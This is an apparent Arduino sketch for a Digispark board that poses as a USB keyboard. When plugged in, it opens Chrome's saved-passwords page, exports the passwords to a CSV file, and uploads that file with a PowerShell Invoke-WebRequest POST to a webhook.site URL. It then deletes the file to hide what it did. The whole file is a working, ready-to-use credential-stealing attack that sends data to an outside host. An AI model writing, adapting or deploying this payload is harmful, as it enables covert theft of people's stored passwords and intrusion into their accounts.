#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key
#define KEY_TAB 0x09
#define MOD_CONTROL_LEFT    (1<<0)
#define KEY_W       26

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop(){
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("chrome");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("chrome://settings/passwords");
  DigiKeyboard.delay(2000);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("win-10");
  //DigiKeyboard.delay(1000);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  //DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.write(KEY_TAB);
  //DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_W,MOD_CONTROL_LEFT );
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd Downloads");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/626a53ac-ec87-46f8-b02a-960708a82d5c -Method POST -InFile win-10.csv"); //Submitting all passwords on hook
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("del win-10.csv");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
